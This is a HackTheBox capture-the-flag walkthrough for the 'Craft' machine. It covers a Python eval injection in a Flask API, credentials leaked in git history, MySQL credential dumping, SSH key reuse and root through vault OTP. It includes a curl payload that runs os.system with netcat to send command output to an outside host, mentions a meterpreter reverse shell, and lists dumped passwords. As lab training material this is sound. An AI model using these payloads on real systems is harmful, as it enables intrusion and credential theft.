# Craft - HackTheBox
## Linux - Medium

### Nmap
With `nmap` we get that ports 22 and 443 are open on the box. Checking 443/HTTPS, we get a webpage with links redirecting either to `api.craft.htb` or `gogs.craft.htb`. We add those to `/etc/hosts`.

### gogs.craft.htb
This is a gogs repository (a github clone basically). We have access to one repo, `craft-api` containing the code for a Flask app implementing a REST API for beers. 

Looking at the issues, we see one for input validation on POST request implementing the dangerous code:
```python
if eval('%s > 1' % request.json['abv']):
  return "ABV must be a decimal value less than 1", 400
```
The `eval` in the script gives us RCE in the POST parameter `abv`. Unfortunately, we need to be authenticated to do POST requests. The API uses JWT tokens for auth. 

Looking at the history of commits, we see one commit by user `dinesh` pushing a test scripts with his credentials hardcoded: `dinesh:4aUh0A8PbVJxgd`.

### api.craft.htb
This is a Swagger endpoint (a GUI for REST API). We see the different requests that can be done. An interesting one is `/auth/login`, which asks us for credentials. We enter the one for `dinesh` and get accepted. The API responds with a JWT token, that can supposedly be used to make POST requests.

### RCE and reverse shell
We use this JWT to perform an RCE with curl:
```bash
curl -k -X POST "https://api.craft.htb/api/brew/" -H  "accept: application/json" -H  "Content-Type: application/json" -H 'X-Craft-API-Token: <JWT TOKEN>' -d "{  \"id\": 0,  \"brewer\": \"string\",  \"name\": \"string\",  \"style\": \"string\",  \"abv\": \"__import__('os').system('ls | nc 10.10.15.250 9001')\"}"
```
We get a response with `netcat` on port 9001. I then proceeded to upload a meterpreter reverse tcp shell (hard to get other simpler reverse shells...)

### MySQL credentials
Our shell is in a docker container running the flask app. We see a python script `dbtest.py` running a test query on a MySQL server. We change this query to 
```sql
SELECT * FROM user
```
and get the response
```
[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
```

### SSH
We try these credentials on gogs.craft.htb, and user `gilfoyle` works. This user has a private repository `craft-infra` showing various config files. There is an `.ssh` folder containing a private and public ssh key for `gilfoyle@craft.htb`.

Using the private key to ssh in the box `ssh -i id_rsa gilfoyle@craft.htb`, we are prompted for a passphrase for the key. The password `ZEU3N8WNM2rh4T` gotten through my MySQL works. And we are in the main host `craft.htb`.

### PrivEsc
Looking around the box, we don't see anything that stands out, except for files referencing the `vault` application. Googling for it, we see that it is a key/secret/auth management system. Looking around the documentation, I find that `vault` can be used to create a ssh login system using OTP.

The magic command is 
```bash
vault ssh root@10.10.10.110
```
which gives us an OTP and then prompts for this same OTP. We enter it and boom! We're in a shell as root!
